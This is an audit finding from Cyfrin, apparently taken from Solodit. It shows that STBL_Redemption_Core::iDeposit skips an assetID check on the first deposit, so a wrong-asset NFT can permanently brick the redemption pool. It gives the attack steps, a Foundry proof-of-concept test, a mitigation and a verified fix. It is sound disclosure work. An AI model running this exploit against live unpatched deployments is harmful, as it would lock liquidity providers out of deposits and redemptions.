---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-06-17-cyfrin-stbl-ess-v2-0-1-1
ingested_at: '2026-07-19T07:07:17Z'
protocol_category: []
published_at: '2026-06-17T00:00:00Z'
related_swc: []
severity: High
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-17-cyfrin-stbl-ess-v2.0.md
tags:
- firm:cyfrin
- report:2026-06-17-cyfrin-stbl-ess-v2-0
title: Missing `assetID` validation in `STBL_Redemption_Core::iDeposit` first-deposit
  path allows wrong-asset NFT to permanently brick the redemption pool
vuln_class: []
---

# Missing `assetID` validation in `STBL_Redemption_Core::iDeposit` first-deposit path allows wrong-asset NFT to permanently brick the redemption pool

_Section severity (from Solodit section header): High_  
_Audit firm: Cyfrin_  
_Source report: [2026-06-17-cyfrin-stbl-ess-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-17-cyfrin-stbl-ess-v2.0.md)_

---

**Description:** `STBL_Redemption_Core` maintains a single pooled YLD NFT (`NFTID`) that represents the combined stake of all LPs. The pool is parameterized with `AssetID` at construction time, and all yield and redemption operations use that `AssetID` to look up the correct distributor and issuer from the registry.

On each new deposit, the incoming NFT is merged into `NFTID` via `STBL_YLD_SplitMerge::merge`, which unconditionally enforces that both inputs share the same `assetID` (`if (metaA.assetID != metaB.assetID) revert STBL_InvalidAsset`).

`iDeposit` fetches the deposited NFT's metadata but only consumes `MetaData.stableValueNet` to update share accounting. It never checks `MetaData.assetID == AssetID`.

When `NFTID == 0` (no deposits yet), the function unconditionally sets `NFTID = _id`. Any caller who holds a YLD NFT from any asset other than the pool's `AssetID` can deposit that NFT as the very first LP, poisoning `NFTID` with a wrong-asset token.

Anyone can trigger this, provided they hold a YLD NFT for any asset other than the pool's `AssetID` and frontrun legitimate LP deposits. A 1-wei value NFT is sufficient.

Attack Details:
1. Attacker calls `deposit(wrongAssetNftId)` as the first LP on a freshly deployed pool. `NFTID == 0`, so `iDeposit` sets `NFTID = wrongAssetNftId` without any `assetID` check.
2. A legitimate LP calls `deposit(correctAssetNftId)`. `iDeposit` takes the `else` branch: `spliter.merge(NFTID, correctAssetNftId)`. `merge()` reads both NFTs' metadata and reverts: `STBL_InvalidAsset(wrongAssetId, correctAssetId)`. Pool is permanently DoS'd for all deposits.
3. `claimYield` calls `distributor.claim(wrongAssetNftId)` — the distributor for `AssetID` has no staking entry for this NFT; reward = 0; `rewardIndex` is never updated.
4. `redeem()` calls `split(wrongAssetNftId, _amt)`, producing two wrong-asset pieces, then calls `issuer.withdraw(piece)` where `issuer` is the correct-asset issuer — it reverts because it did not mint that NFT.
5. `NFTID` is written only in `iDeposit` (lines 127, 129), `iWithdraw` (line 156), and `iRedeem` (line 193). All three preserve the wrong-asset token as `NFTID`.

**Impact:**
1. Once `NFTID` holds a wrong-asset NFT, every subsequent legitimate deposit reverts at `merge`.
2. `iClaimYield` passes the wrong NFT ID to the correct asset's `YieldDistributor::claim`, which has no staking entry for that ID and returns 0.
3. `iRedeem` splits the wrong-asset NFT and passes the resulting piece to the correct asset's `issuer::withdraw`, which also reverts since the issuer did not mint it.

**Proof of Concept:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Helper} from "./helper.t.sol";

import {STBL_YLD_SplitMerge} from "../contracts/splitter/STBL_YLD_SplitMerge.sol";
import {STBL_Redemption} from "../contracts/redemption/STBL_Redemption.sol";
import {STBL_Redemption_Core} from "../contracts/redemption/STBL_Redemption_Core.sol";

import {STBL_PT1_Issuer} from "@stbl-protocol/stbl-contracts-evm-asset-type1/contracts/issuers/STBL_PT1_Issuer.sol";
import {STBL_TestToken} from "@stbl-protocol/stbl-contracts-evm-asset-type1/contracts/test/STBL_TestToken.sol";

import "@stbl-protocol/stbl-contracts-evm-core/contracts/lib/STBL_Structs.sol";
import {STBL_InvalidAsset} from "../contracts/lib/STBL_Errors.sol";

// ─────────────────────────────────────────────────────────────────────────────
//  Thin wrapper that exposes internal state for test assertions only.
//  Production users interact with STBL_Redemption, not this contract.
// ─────────────────────────────────────────────────────────────────────────────
contract InspectableRedemption2 is STBL_Redemption {
    constructor(
        address _register,
        address _splitter,
        uint256 _assetID
    ) STBL_Redemption(_register, _splitter, _assetID) {}

    function getNFTID() external view returns (uint256) {
        return NFTID;
    }

    function getTotalSupply() external view returns (uint256) {
        return totalSupply;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
//  PoC Test Suite
//  Two assets: slot 1 = pool's asset, slot 2 = attacker's wrong asset.
//  The redemption pool is deployed for asset 1 only.
// ─────────────────────────────────────────────────────────────────────────────
contract iDepositWrongAsset_PoC is Helper {
    // Contracts under test
    STBL_YLD_SplitMerge public splitMerge;
    InspectableRedemption2 public redemption;

    uint256 constant DEPOSIT = 10_000 * 1e18;
    uint256 constant ATTACKER_DEPOSIT = 1e18;

    uint256 public assetRegID1; // registry ID for the pool's asset (slot 1)
    uint256 public assetRegID2; // registry ID for the attacker's wrong asset (slot 2)

    function setUp() public override {
        super.setUp();

        // Deploy two PT1 assets: slot 1 = pool asset, slot 2 = wrong asset
        deployAsset(1, AssetType.PT1);
        deployAsset(2, AssetType.PT1);

        assetRegID1 = getAssetRegistryId(1);
        assetRegID2 = getAssetRegistryId(2);

        vm.startPrank(admin);

        // Fund user1 (legitimate LP) with slot-1 tokens
        STBL_TestToken(getAssetToken(1)).mint(user1);

        // Fund user2 (attacker) with slot-2 tokens (minimum cost)
        STBL_TestToken(getAssetToken(2)).mintVal(user2, ATTACKER_DEPOSIT);

        // Deploy SplitMerge, grant MINTER_ROLE on YLD and SPLITTER_ROLE on registry
        splitMerge = new STBL_YLD_SplitMerge(address(registry));
        yld.grantRole(yld.MINTER_ROLE(), address(splitMerge));
        registry.grantRole(keccak256("SPLITTER_ROLE"), address(splitMerge));

        // Deploy redemption pool for asset 1 ONLY
        redemption = new InspectableRedemption2(
            address(registry),
            address(splitMerge),
            assetRegID1
        );

        vm.stopPrank();
    }

    // Issue a YLD NFT to `_user` by depositing `_amount` via the PT1 Issuer for `_assetSlot`.
    function _issueNFT(
        address _user,
        uint256 _assetSlot,
        uint256 _amount
    ) internal returns (uint256 nftId) {
        vm.startPrank(_user);
        STBL_TestToken(getAssetToken(_assetSlot)).approve(
            getAssetVault(_assetSlot),
            _amount
        );
        nftId = STBL_PT1_Issuer(getAssetIssuer(_assetSlot)).deposit(_amount);
        vm.stopPrank();
    }

    /// @notice PoC: iDeposit() first-deposit path missing assetID check — wrong-asset NFT permanently bricks pool
    /// Title:    iDeposit() first-deposit path missing assetID check — wrong-asset NFT permanently bricks pool
    /// Affected: STBL_Redemption_Core.iDeposit() (lines 121-135)
    /// Impact:   Permanent DoS of all LP deposits; pool must be redeployed
    /// Author:   0xStalin
    function test_poc_wrongAssetNFT_permanentlyBricksPool() public {
        // == [ Setup ] ==

        // Attacker (user2) issues a YLD NFT backed by asset 2 (wrong asset)
        uint256 wrongAssetNftId = _issueNFT(user2, 2, ATTACKER_DEPOSIT);
        YLD_Metadata memory wrongMeta = yld.getNFTData(wrongAssetNftId);

        // Legitimate LP (user1) issues a YLD NFT backed by asset 1 (correct asset)
        uint256 correctAssetNftId = _issueNFT(user1, 1, DEPOSIT);
        YLD_Metadata memory correctMeta = yld.getNFTData(correctAssetNftId);

        // == [ Pre-condition: Pool is empty ] ==

        assertEq(redemption.getNFTID(), 0, "pre-condition: NFTID must be 0 (pool empty)");

        console.log("--- Pre-Attack State ---");
        console.log("Pool NFTID (should be 0):", redemption.getNFTID());
        console.log("Wrong-asset NFT assetID:", wrongMeta.assetID);
        console.log("Correct-asset NFT assetID:", correctMeta.assetID);
        console.log("Pool configured for assetRegID1:", assetRegID1);

        // == [ Step 1: Attacker deposits wrong-asset NFT as first LP ] ==
        // NFTID == 0, so iDeposit takes the first-deposit branch:
        //   NFTID = _id   <-- no assetID check against AssetID (BUG)

        vm.startPrank(user2);
        yld.approve(address(redemption), wrongAssetNftId);
        redemption.deposit(wrongAssetNftId);
        vm.stopPrank();

        // == [ Step 2: Pool NFTID is now poisoned ] ==

        uint256 poisonedNFTID = redemption.getNFTID();
        assertEq(
            poisonedNFTID,
            wrongAssetNftId,
            "step 2: NFTID must be set to the wrong-asset NFT"
        );

        YLD_Metadata memory poolMeta = yld.getNFTData(poisonedNFTID);
        assertEq(
            poolMeta.assetID,
            assetRegID2,
            "step 2: pool NFT assetID is wrong-asset registry ID"
        );

        console.log("--- Post-Attack-Step-1 State ---");
        console.log("Pool NFTID (poisoned):", poisonedNFTID);
        console.log("Pool NFT assetID (should be assetRegID2):", poolMeta.assetID);
        console.log("Expected pool assetRegID1:", assetRegID1);

        // == [ Step 3: Legitimate LP deposit is permanently DoS'd ] ==
        // NFTID != 0, so iDeposit takes the else branch:
        //   NFTID = spliter.merge(NFTID, _id)
        // merge() enforces metaA.assetID == metaB.assetID, which fails here
        // because NFTID.assetID == assetRegID2 != correctAssetNftId.assetID == assetRegID1

        vm.startPrank(user1);
        yld.approve(address(redemption), correctAssetNftId);
        vm.expectRevert(
            abi.encodeWithSelector(
                STBL_InvalidAsset.selector,
                assetRegID2,
                assetRegID1
            )
        );
        redemption.deposit(correctAssetNftId);
        vm.stopPrank();

        // == [ Verify Impact ] ==

        // NFTID still points to the wrong-asset NFT (pool permanently bricked)
        assertEq(
            redemption.getNFTID(),
            wrongAssetNftId,
            "impact: NFTID still poisoned after failed legitimate deposit"
        );

        // Pool still contains the wrong-asset NFT (no recovery path)
        assertEq(
            yld.ownerOf(wrongAssetNftId),
            address(redemption),
            "impact: wrong-asset NFT still locked in pool"
        );

        // Legitimate LP's NFT was not consumed — it is still owned by user1
        assertEq(
            yld.ownerOf(correctAssetNftId),
            user1,
            "impact: legitimate LP's NFT not transferred (deposit reverted)"
        );

        console.log("--- Post-Attack Final State ---");
        console.log("Pool NFTID (still poisoned):", redemption.getNFTID());
        console.log("Pool totalSupply:", redemption.getTotalSupply());
        console.log("Wrong-asset NFT owner (pool address):", yld.ownerOf(wrongAssetNftId));
        console.log("[+] CONFIRMED: Pool permanently DoS'd via wrong-asset first deposit");
    }
}
```

**Recommended Mitigation:** Add an `assetID` check in `iDeposit` immediately after fetching `MetaData` and before the `NFTID` branch. The `STBL_InvalidAsset` custom error is already imported and can be reused.

**STBL:** Fixed in commit [08f6ad6](https://github.com/USD-Pi-Protocol/stbl-contracts-evm-redemptions/commit/08f6ad6711d7d24875ec761fbb6b2597dad1ab3d).

**Cyfrin:** Verified. Implemented the recommended mitigation, now, the `assetId` of the incoming YLD_NFT is validated to be the same as the expected assetId set for the redemption pool.
